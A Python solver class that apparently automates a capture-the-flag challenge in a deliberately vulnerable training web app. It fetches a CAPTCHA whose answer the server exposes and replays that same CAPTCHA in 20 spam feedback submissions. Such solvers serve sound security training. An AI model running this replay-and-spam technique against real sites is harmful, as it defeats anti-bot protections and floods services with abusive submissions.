from core.base_solver import BaseSolver
from loguru import logger

class CaptchaBypassSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "captchaBypassChallenge"

    def solve(self) -> bool:
        # 1. Get CAPTCHA
        captcha_res = self.client.get("/rest/captcha")
        captcha_data = captcha_res.json()
        captcha_id = captcha_data.get("captchaId")
        answer = str(captcha_data.get("answer"))
        
        # 2. Spam 20 requests with same CAPTCHA
        success_count = 0
        payload = {
            "captchaId": captcha_id,
            "captcha": answer,
            "comment": "Spam",
            "rating": 1
        }
        for _ in range(20):
            res = self.client.post("/api/Feedbacks", json=payload)
            if res.status_code == 201:
                success_count += 1
        return success_count >= 10 # Assuming threshold
